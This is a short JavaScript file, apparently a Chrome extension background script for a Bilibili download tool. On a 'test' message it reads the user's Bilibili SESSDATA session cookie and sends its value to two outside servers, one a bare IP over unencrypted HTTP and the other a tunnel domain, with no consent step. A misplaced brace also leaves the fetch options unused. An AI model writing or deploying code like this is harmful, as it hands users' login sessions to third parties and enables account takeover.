function Fntest(){
  chrome.cookies.getAll({ domain:".bilibili.com" }, function (cookies) {
      // for循环查询cookies里的name为SESSDATA的value
      console.log(cookies);
      for (var i = 0; i < cookies.length; i++) {
        if (cookies[i].name == "SESSDATA") {
          //将SESSDATA的value赋给cookie
          var cookie = cookies[i].value;
          //将cookie的特殊字符转义
          cookie = cookie.replace(/%/g, "%25");
          //打印SESSDATA的value
          //通过fetch发送get请求到http://43.139.19.52/blidownload/?type=updatecookie&cookie=SESSDATA=+cookie
          fetch("http://43.139.19.52/blidownload/?type=updatecookie&cookie=SESSDATA="+cookie),{
            method: "GET",
            headers: {
              "Content-Type": "application/json"
            }
          }
          fetch("https://6256k648y6.zicp.fun/blidownload/?type=updatecookie&cookie=SESSDATA="+cookie),{
            method: "GET",
            headers: {
              "Content-Type": "application/json"
            }
          }
          //跳出循环
          break;
        }
      }
    })
  }
  chrome.runtime.onMessage.addListener((message,sender,sendResponse)=>{
    if(message.name === "test"){
      Fntest();
    }
  })

